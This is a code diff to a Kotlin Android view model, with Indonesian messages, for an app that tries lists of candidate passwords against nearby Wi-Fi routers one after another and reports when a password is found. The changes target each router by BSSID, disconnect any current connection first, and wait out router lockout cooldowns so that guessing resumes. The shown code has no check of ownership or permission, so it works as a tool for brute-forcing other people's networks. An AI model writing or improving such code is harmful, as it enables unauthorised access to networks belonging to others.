@@ -217,7 +217,7 @@ class AroundCheckViewModel(
         dismissPasswordDialog()
 
         viewModelScope.launch(dispatcher) {
-            connector.connect(target.ssid, password, target.security)
+            connector.connect(target.ssid, password, target.security, target.bssid)
         }
     }
 
@@ -371,9 +371,16 @@ class AroundCheckViewModel(
                 }
                 if (!isActive) break
 
+                // Pre-flight check: jika perangkat sedang terhubung ke router ini, reset koneksi agar pengujian murni
+                if (connector.isCurrentlyConnectedTo(candidate.ssid, candidate.bssid)) {
+                    _sequentialTestMessage.value = "Perangkat sedang terhubung ke ${candidate.ssid}. Mengabaikan koneksi lama..."
+                    connector.cancel()
+                    delay(500L)
+                }
+
                 _sequentialTestMessage.value = "BFS [${index + 1}/${scanItems.size}]: Menguji ${candidate.ssid}..."
                 connector.cancel()
-                connector.connect(candidate.ssid, password, candidate.security)
+                connector.connect(candidate.ssid, password, candidate.security, candidate.bssid)
 
                 val resultState = connectState.first { state ->
                     state.targetSsid == candidate.ssid && (
@@ -470,9 +477,15 @@ class AroundCheckViewModel(
 
         traversalJob?.cancel()
         traversalJob = viewModelScope.launch(dispatcher) {
+            if (connector.isCurrentlyConnectedTo(target.ssid, target.bssid)) {
+                _sequentialTestMessage.value = "Perangkat sedang terhubung ke ${target.ssid}. Melepaskan koneksi untuk pengujian bersih..."
+                connector.cancel()
+                delay(500L)
+            }
+
             var consecutiveFailures = 0
-            for (index in validPasswords.indices) {
-                if (!isActive) break
+            var index = 0
+            while (index < validPasswords.size && isActive) {
                 _currentCandidateIndex.value = index
                 val candidatePassword = validPasswords[index]
 
@@ -491,7 +504,7 @@ class AroundCheckViewModel(
                 delay(500L)
 
                 _sequentialTestMessage.value = "DFS [${index + 1}/${validPasswords.size}]: Menguji '${maskPassword(candidatePassword)}' pada ${target.ssid}..."
-                connector.connect(target.ssid, candidatePassword, target.security)
+                connector.connect(target.ssid, candidatePassword, target.security, target.bssid)
 
                 val resultState = connectState.first { state ->
                     state.targetSsid == target.ssid && (
@@ -501,6 +514,16 @@ class AroundCheckViewModel(
                         state.status == WifiConnectStatus.Timeout ||
                         state.status is WifiConnectStatus.Cooldown
                     )
+                }
+
+                if (resultState.status is WifiConnectStatus.Cooldown) {
+                    val remaining = (resultState.status as WifiConnectStatus.Cooldown).remainingSeconds
+                    for (sec in remaining downTo 1) {
+                        if (!isActive) break
+                        _sequentialTestMessage.value = "Cooldown router: menunggu ${sec}s..."
+                        delay(1000L)
+                    }
+                    continue
                 }
 
                 if (resultState.status == WifiConnectStatus.Connected) {
@@ -530,6 +553,7 @@ class AroundCheckViewModel(
                             break
                         }
                     }
+                    index++
                 }
             }
 
@@ -598,10 +622,17 @@ class AroundCheckViewModel(
                     continue
                 }
 
+                // Pre-flight check: Putuskan koneksi jika perangkat sedang terhubung ke router target
+                if (connector.isCurrentlyConnectedTo(router.ssid, router.bssid)) {
+                    _sequentialTestMessage.value = "Perangkat sedang terhubung ke ${router.ssid}. Melepaskan koneksi untuk pengujian bersih..."
+                    connector.cancel()
+                    delay(500L)
+                }
+
                 // 3. Uji DFS pada router ini
                 var foundPassword: String? = null
-                for (passIndex in validPasswords.indices) {
-                    if (!isActive) break
+                var passIndex = 0
+                while (passIndex < validPasswords.size && isActive) {
                     val candidatePassword = validPasswords[passIndex]
 
                     // Update status live Testing
@@ -622,7 +653,7 @@ class AroundCheckViewModel(
                     delay(500L)
 
                     _sequentialTestMessage.value = "Hybrid [${routerIndex + 1}/${scanItems.size}]: Menguji '${maskPassword(candidatePassword)}' pada ${router.ssid}..."
-                    connector.connect(router.ssid, candidatePassword, router.security)
+                    connector.connect(router.ssid, candidatePassword, router.security, router.bssid)
 
                     val resultState = connectState.first { state ->
                         state.targetSsid == router.ssid && (
@@ -632,6 +663,16 @@ class AroundCheckViewModel(
                             state.status == WifiConnectStatus.Timeout ||
                             state.status is WifiConnectStatus.Cooldown
                         )
+                    }
+
+                    if (resultState.status is WifiConnectStatus.Cooldown) {
+                        val remaining = (resultState.status as WifiConnectStatus.Cooldown).remainingSeconds
+                        for (sec in remaining downTo 1) {
+                            if (!isActive) break
+                            _sequentialTestMessage.value = "Cooldown router ${router.ssid}: menunggu ${sec}s..."
+                            delay(1000L)
+                        }
+                        continue
                     }
 
                     if (resultState.status == WifiConnectStatus.Connected) {
@@ -650,6 +691,8 @@ class AroundCheckViewModel(
                         sendSnackbar("Password ditemukan untuk ${router.ssid}!")
                         break // LANGSUNG BREAK loop passphrase -> Lanjut ke Router berikutnya!
                     }
+
+                    passIndex++
                 }
 
                 // Jika seluruh passphrase selesai diuji dan tidak ada yang berhasil
